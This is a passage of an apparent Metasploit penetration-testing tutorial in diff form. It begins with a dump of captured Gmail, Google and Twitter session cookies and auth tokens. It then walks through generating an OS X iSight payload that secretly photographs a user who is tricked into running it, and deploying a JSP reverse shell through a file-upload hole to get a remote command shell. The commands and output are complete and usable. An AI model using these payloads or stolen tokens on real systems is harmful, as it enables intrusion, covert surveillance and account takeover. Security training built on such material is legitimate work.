+ 14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+ 15|2009-05-09 23:47:07|1|http_request|gmail.google.com:80 GET /forms.html Windows FF 1.9.0.10
+ 16|2009-05-09 23:47:07|1|http_cookies|google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+ 17|2009-05-09 23:47:07|1|http_request|google.com:80 GET /forms.html Windows FF 1.9.0.10
+ 18|2009-05-09 23:47:07|1|http_request|linkedin.com:80 GET /forms.html Windows FF 1.9.0.10
+
+ 101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
+ 102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10
+ 108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
+ 109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
+ sqlite>
+
+
+MSF vs OS X
+============
+
+One of the more interesting things about the Mac platform is how cameras are built into all of their laptops. This fact has not gone unnoticed by Metasploit developers, as there is a very interesting module that will take a picture with the built in camera.
+
+Lets see it in action. First we generate a stand alone executable to transfer to a OS X system:
+
+::
+
+  root@kali:~# msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2
+ Found 10 compatible encoders
+ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 171 (iteration=0)
+ x86/shikata_ga_nai chosen with final size 171
+ Payload size: 171 bytes
+
+
+So, in this scenario we trick the user into executing the executable we have created, then we use ‘multi/handler’ to connect in and take a picture of the user.
+
+::
+
+  msf > use multi/handler
+ msf exploit(handler) > set PAYLOAD osx/x86/isight/bind_tcp
+ PAYLOAD => osx/x86/isight/bind_tcp
+ msf exploit(handler) > show options
+
+ Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+ Payload options (osx/x86/isight/bind_tcp):
+
+   Name      Current Setting                                  Required  Description
+   ----      ---------------                                  --------  -----------
+   AUTOVIEW  true                                             yes       Automatically open the picture in a browser
+   BUNDLE    ~/data/isight.bundle                             yes       The local path to the iSight Mach-O Bundle to upload
+   LPORT     4444                                             yes       The local port
+   RHOST                                                      no        The target address
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+ msf exploit(handler) > ifconfig eth0
+ [*] exec: ifconfig eth0
+
+ eth0      Link encap:Ethernet  HWaddr 00:0c:29:a7:f1:c5
+          inet addr:172.16.104.150  Bcast:172.16.104.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fea7:f1c5/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:234609 errors:4 dropped:0 overruns:0 frame:0
+          TX packets:717103 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:154234515 (154.2 MB)  TX bytes:58858484 (58.8 MB)
+          Interrupt:19 Base address:0x2000
+
+ msf exploit(handler) > set RHOST 172.16.104.1
+ RHOST => 172.16.104.1
+
+ msf exploit(handler) > exploit
+
+ [*] Starting the payload handler...
+ [*] Started bind handler
+ [*] Sending stage (421 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading bundle (29548 bytes)...
+ [*] Upload completed.
+ [*] Downloading photo...
+ [*] Downloading photo (13571 bytes)...
+ [*] Photo saved as /root/.msf4/logs/isight/172.16.104.1_20090821.495489022.jpg
+ [*] Opening photo in a web browser...
+ Error: no display specified
+ [*] Command shell session 2 opened (172.16.104.150:57008 -> 172.16.104.1:4444)
+ [*] Command shell session 2 closed.
+ msf exploit(handler) >
+
+
+
+Very interesting! It appears we have a picture! Lets see what it looks like.
+
+File-Upload Backdoors
+===================
+
+Amongst its many tricks, Metasploit also allows us to generate and handle Java based shells to gain remote access to a system. There are a great deal of poorly written web applications out there that can allow you to upload an arbitrary file of your choosing and have it run just by calling it in a browser.
+
+We begin by first generating a reverse-connecting jsp shell and set up our payload listener.
+
+::
+
+  root@kali:~# msfvenom -a x86 --platform windows -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 -f raw
+ msf > use exploit/multi/handler
+ msf exploit(handler) > set PAYLOAD java/jsp_shell_reverse_tcp
+ PAYLOAD => java/jsp_shell_reverse_tcp
+ msf exploit(handler) > set LHOST 192.168.1.101
+ LHOST => 192.168.1.101
+ msf exploit(handler) > set LPORT 8080
+ LPORT => 8080
+ msf exploit(handler) > exploit
+
+ [*] Started reverse handler on 192.168.1.101:8080
+ [*] Starting the payload handler...
+
+
+At this point, we need to upload our shell to the remote web server that supports jsp files. With our file uploaded to the server, all that remains is for us to request the file in our browser and receive our shell.
+
+
+::
+
+  [*] Command shell session 1 opened (192.168.1.101:8080 -> 192.168.1.201:3914) at Thu Feb 24 19:55:35 -0700 2011
+
+ hostname
+ hostname
+ xen-xp-sploit
+
+ C:\Program Files\Apache Software Foundation\Tomcat 7.0>ipconfig
+ ipconfig
+
+ Windows IP Configuration
+
+
+ Ethernet adapter Local Area Connection 3:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.1.201
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.1.1
+
+ C:\Program Files\Apache Software Foundation\Tomcat 7.0>
+
+
+File Inclusion Vulnerabilities
+=================================
